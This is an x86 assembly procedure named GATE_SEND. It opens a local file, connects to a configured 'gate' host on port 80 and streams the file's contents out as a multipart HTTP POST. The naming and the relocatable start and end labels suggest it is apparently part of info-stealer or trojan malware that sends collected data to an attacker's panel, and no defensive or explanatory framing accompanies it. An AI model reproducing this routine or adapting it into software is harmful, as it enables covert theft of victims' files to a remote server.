gate_send_start:

GATE_SEND proc
; ����� "TmpBuf"
     LOCAL h :DWORD
     LOCAL rb :DWORD
     LOCAL _fs :DWORD
     LOCAL sock :DWORD
     
     CreateFile, addr cpyfrom, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
     cmp     eax, INVALID_HANDLE_VALUE
     je      g_error0
     mov     h, eax
     GetFileSize, h, 0
     mov     _fs, eax
     
     push    IPPROTO_IP
     push    SOCK_STREAM
     push    AF_INET
     call    dword ptr [_socket]
     mov     sock, eax
     cmp     eax, INVALID_SOCKET
     je      g_error1
     
     mov     ca.sin_family, AF_INET
     push    80
     call    dword ptr [_htons]
     mov     ca.sin_port, ax
     
     push    dword ptr [hGateHost]
     call    dword ptr [_gethostbyname]
     .if     ( eax == 0 )
             jmp     g_error2
     .else
             assume  eax: ptr hostent
             mov     eax, [eax].h_list
             mov     eax, dword ptr [eax]
             mov     eax, dword ptr [eax]
             mov     ca.sin_addr, eax
     .endif
     push    sizeof ca
     push    offset ca
     push    dword ptr [sock]
     call    dword ptr [_connect]
     test    eax, eax
     jne     g_error2
     
     push    offset sh13
     push    offset cpyfrom
     push    offset sh12
     push    offset boundary
     push    offset sh11
     push    offset gate_format_str1
     push    offset SubHeader1
     call    wsprintf
     add     esp, 7*4
     
     push    offset crlf
     push    offset sh11
     push    offset boundary
     push    offset sh11
     push    offset crlf
     push    offset gate_format_str1
     push    offset SubHeader2
     call    wsprintf
     add     esp, 7*4
     
     mov     ebx, dword ptr [_fs]
     lstrlen, addr SubHeader1
     add     ebx, eax
     lstrlen, addr SubHeader2
     add     ebx, eax
     push    ebx
     push    offset format_str
     push    offset TmpBuf
     call    wsprintf
     add     esp, 3*4
     
     push    offset SubHeader1
     push    offset crlf
     push    offset crlf
     push    offset TmpBuf
     push    offset sh17
     push    offset boundary
     push    offset sh16
     push    dword ptr [hGateHost]
     push    offset sh15
     push    dword ptr [hGatePath]
     push    offset sh14 ; 1
     push    offset gate_format_str2
     push    offset HTTPHeader
     call    wsprintf
     add     esp, 11*4
     
     lstrlen, addr HTTPHeader
     push    0
     push    eax
     push    offset HTTPHeader
     push    dword ptr [sock]
     call    dword ptr [_send]
send_start:
     cmp     eax, -1
     je      send_lp
     ReadFile, h, addr readbuf, sizeof readbuf, addr rb, 0
     cmp     dword ptr [rb], 0
     je      send_lp
     push    0
     push    dword ptr [rb]
     push    offset readbuf
     push    dword ptr [sock]
     call    dword ptr [_send]
     jmp     send_start
send_lp:
     lstrlen, addr SubHeader2
     push    0
     push    eax
     push    offset SubHeader2
     push    dword ptr [sock]
     call    dword ptr [_send]
     
g_error2:
     push    dword ptr [sock]
     call    dword ptr [_closesocket]
g_error1:
     CloseHandle, h
g_error0:
     ret
GATE_SEND endp

gate_send_end: